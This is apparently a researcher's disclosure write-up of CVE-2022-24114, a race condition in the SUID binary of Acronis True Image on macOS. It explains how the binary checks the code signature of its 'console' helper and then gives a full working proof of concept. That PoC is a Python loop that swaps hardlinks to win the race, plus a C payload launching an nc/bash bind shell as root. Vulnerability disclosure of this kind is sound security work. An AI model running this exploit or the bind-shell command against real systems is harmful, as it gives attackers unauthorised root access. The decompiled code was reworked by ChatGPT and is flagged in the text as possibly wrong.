## Root Privilege Escalation Via Race Condition in SUID Binary (CVE-2022-24114)

#### Background
The Acronis True Image (now called Acronis Cyber Protect Home Office) application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does various checks on the "console" binary before it is run to verify that it is signed correctly. By using a hardlink to the SUID binary we can coerce it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst checking if it is valid. We set up an environment where we can replace console at will, and try to win a race where we replace the "console" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root. 

#### Discovering the Vulnerability 
After running a tool over the `/Application/Acronis True Image/` directory I noticed that the `Acronis True Image` binary had the SUID bit set on it, running the process as root even if launched by a normal user. Looking over this application, I noticed that the application has a function called `LinuxEx::CreateProcessWait (path)` that runs the binary at the path via `exec`  on macOS if it passes the checks that are implemented in `isAllowedToExecute`.

```objc
entry() { 
    ...
	std::string file = "{PATH_BINARY_IS_RUN_FROM}/console"
	if(isAllowedToExecute(file))
	{
	    ...
        LinuxEx::CreateProcessWait(file, false, 0x0);
	}
	...
}	
```

```objc
- (BOOL)isAllowedToExecute(std::string<char> path) {
  NSString *ns_path = [TrueImage toNSString:path];
  BOOL isAllowed = [TrueImage.privilegedHelperTool isBinaryAllowedToBeExecuted:ns_path];

  if (!isAllowed) {
    std::cerr << "Unable to launch '" << param << "'" << std::endl;
    return NO;
  }
  return YES;
}
```

`isBinaryAllowedToBeExecuted` does the following checks.
* Checks that a `SecStaticCode` object can be constructed from the binary at `binaryPath` using `SecStaticCodeCreateWithPath`.
* Checks that the binary at `binarypath` meets the requirement that is stored at `GetSecRequirement()::requirement` using `SecStaticCodeCheckValidityWithErrors`.
 * Checks the signing time of the SUID binary, if it is not 0, checks the signing time of the binary at `binaryPath` using `GetSigningTime`  for both which calls `SecCodeCopySigningInformation` and extracts the signing time from the dictionary using the `kSecCodeInfoTime` key. 
 * Checks that the binary at `binaryPath` was not signed more then 3 hours after the SUID binary, using `timeIntervalSinceDate` and the two signing times from the previous step.

If the binary fails any of these checks then it won't be run. The following is an Objective C implementation of the `isBinaryAllowedToBeExecuted`. ChatGPT has been used to improve readability of the decompiled code, and so it may contain errors.

```objc
- (BOOL)isBinaryAllowedToBeExecuted(NSString *binaryPath) {
    int result;
    long length = [binaryPath length];
    if (length == 0) {
        result = 0;
    }
    [NSURL fileURLWithPath:binaryPath];
    length = [self retainAutoreleasedReturnValue];
    if (length == 0) {
        result = 0;
    }
    else {
        SecCode staticCode;
        result = SecStaticCodeCreateWithPath(binaryPath, 0, &staticCode);
        if (result != 0 || staticCode == (__SecCode *)0x0) {
            NSLog(@"Unable to get CodeRef of file at '%@'", binaryPath);
            result = 0;
        }
        else {
            if (onceToken != -1) {
                dispatch_once(&GetSecRequirement()::onceToken, &block);
            }
            if (requirement == 0) {
                result = 0;
            }
            else {
                result = SecStaticCodeCheckValidityWithErrors(staticCode, 0, GetSecRequirement()::requirement, 0);
                if (result != 0) {
                    NSLog(@"Path validation failed: '%@'", binaryPath);
                    result = 0;
                }
                else {
                    if (selfOnceToken != -1) {
                        dispatch_once(&GetSelfStaticCode()::onceToken, &selfBlock);
                    }
                    long signingTime GetSigningTime(GetSelfStaticCode()::staticCodeRef);
                    if (signingTime == 0) {
                        NSLog(@"Current binary is not signed!");
                        result = 0;
                    }
                    else {
                        long binarySigningTime = GetSigningTime(staticCode)
                        if (binarySigningTime == 0) {
                            NSLog(@"Binary is not signed: '%@'", binaryPath);
                            result = 0;
                        }
                        else {
                            double delta = [signingTime timeIntervalSinceDate:binarySigningTime];
                            if (ABS(delta) > 10800.0) {
                                NSLog(@"Signing time delta is too big!");
                                result = 0;
                            }
                            else {
                                NSLog(@"Path validation success: '%@'", binaryPath);
                                result = 1;
                            }
                            [binarySigningTime release];
                        }
                        [signingTime release];
                    }
                }
                [staticCode release];
            }
        }
        [obj release];
    }
    return result;
}
```

Most of the checks are pretty self-explanatory, the only real question left is what is the requirement that is passed into `SecStaticCodeCheckValidityWithErrors`. We can get this value by debugging the application and setting a breakpoint on the `SecStaticCodeCheckValidityWithErrors` call and dump the variable. 

```
Security`SecRequirementCreateWithStringAndErrors:
    0x1952436fc <+0>: pacibsp 
Target 0: (Acronis Cyber Protect Home Office) stopped.
(lldb) register read
General Purpose Registers:
        x0 = 0x0000600000ee4240
        x1 = 0x0000000000000000
        x2 = 0x0000000100fc1df0  Acronis Cyber Protect Home Office`TrueImage::PrivilegedHelperTool::(anonymous namespace)::GetSecRequirement()::requirement
        x3 = 0x0000600000ee428d
        x4 = 0x0000000000405830
        x5 = 0x000000000000000f
        x6 = 0x0000000000000000
        x7 = 0x0000000000000000
        x8 = 0x0000000000000000
        x9 = 0x0000000100000000
       x10 = 0x000000020000078c
       x11 = 0x0000600000ee4248
       x12 = 0x000000010000078c
       x13 = 0x0000000158004520
       x14 = 0x000000008c242800
       x15 = 0x00000001eb9e9450  (void *)0x00000001eb9e9400: __NSCFString
       x16 = 0x00000001952436f0  Security`SecRequirementCreateWithString
       x17 = 0x002e800192fd8720  (0x0000000192fd8720) CoreFoundation`-[__NSCFString retain]
       x18 = 0x0000000000000000
       x19 = 0x0000000000000000
       x20 = 0x0000600000ee4240
       x21 = 0x00000001dd2ca7da  
       x22 = 0x0000000100fc0000  (void *)0x0000000192ff4ebc: CFArrayGetCount
       x23 = 0x0000600003cee140
       x24 = 0x00006000018e8300
       x25 = 0x00006000032f0a20
       x26 = 0x00006000032ec3c0
       x27 = 0x0000000000000005
       x28 = 0x00000001ed1c6ea8  @"2.16.840.1.113741.2.1.1.1.8"
        fp = 0x000000016ee7f1e0
        lr = 0x0000000100fa564c  Acronis Cyber Protect Home Office`invocation function for block in TrueImage::PrivilegedHelperTool::(anonymous namespace)::GetSecRequirement() + 884
        sp = 0x000000016ee7f070
        pc = 0x00000001952436f0  Security`SecRequirementCreateWithString
      cpsr = 0x60001000

(lldb) po 0x0000600000ee4240
anchor apple generic and certificate leaf [subject.CN] = "Developer ID Application: Acronis International GmbH (ZU2TV78AA6)"
```

We can see that the requirement string is `anchor apple generic and certificate leaf [subject.CN] = "Developer ID Application: Acronis International GmbH (ZU2TV78AA6)`

Running the application with a hardlink shows that the SUID binary will try and run the "console" application from the same path as the hardlink, but the security checks fail if you use a different binary 
```text
running launcher with privileges...
2023-01-03 23:21:36.252 run [1247:17898] Requirement of the current process retrieved
2023-01-03 23:21:36.255 run [1247:17898] Path validation failed: /Users/test/Desktop/console
Unable to launch ' /Users/test/Desktop/console'
```

Running the application from the real path shows that everything passes and runs okay. 
```text
running launcher with privileges...
2023-01-04 01:16:01.429 Acronis True Image [1417:54396] Requirement of the current process retrieved
2023-01-04 01:16:01.696 Acronis True Image [1417:54396] Path validation success: /Applications/Acronis True Image.app/Contents/MacOS/console running main application..
export USER_ID="501"; "/Applications/Acronis True Image. app/Contents/MacOS/console' -AppleLocale en_US -AppleLanguages "(en-US)" -UserGuard:501 &
```
### Exploiting the Vulnerability

To exploit the vulnerability we need to win the race. Because the application doesn't crash, and can be run an arbitrary amount of times, we can brute force the timing we need to win the race.

First we set up the hardlinks so that we can run the application in our local directory that we have control over. 

```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
```

Then we define a delay variable that we are going to increase until the vulnerability is successly exploited. We then run the SUID binary and switch out the console binary with ever increasing wait times until we successfully exploit the race condition. 

```python
delay = 0.01 
while True: 
	os.popen("./run")
	time.sleep(delay)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	delay += 0.01 
```
We will know when it succeeds because the PoC will write a file called "pass" to the folder that the script was run from. From here we clean up and delete all of our hardlinks and exit the script. 
```python
	if os.path.exists("./pass"):
		os.unlink("./console")
		os.unlink("./run")
		os.unlink("./pass")
		exit()
```

### Running The PoC 
First we make the shell command to run 
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```
Now lets make the c program that will run this shell command naming it test.c
```c
#include <stdlib.h>
int main() {
	system("touch pass;bash shell");
	return 0;
}
```
Compile the program
```bash
gcc test.c 
```
Run the following python program. The program will run for a number of iterations before it works.
```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

delay = 0.01 
while True: 
	os.popen("./run")
	time.sleep(delay)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	delay += 0.01 
	if os.path.exists("./pass"):
		os.unlink("./console")
		os.unlink("./run")
		os.unlink("./pass")
		exit()
```
Connect to the root shell
```bash
nc 127.0.0.1 8080
```

##### Video of the exploit running 

![image](https://github.com/vkas-afk/vkas-afk.github.io/blob/main/26_%20february_2023_demo_opt.gif)

### Affected Versions 
* Acronis Cyber Protect Home Office (macOS) before build 39605
* Acronis True Image 2021 (macOS) before build 39287
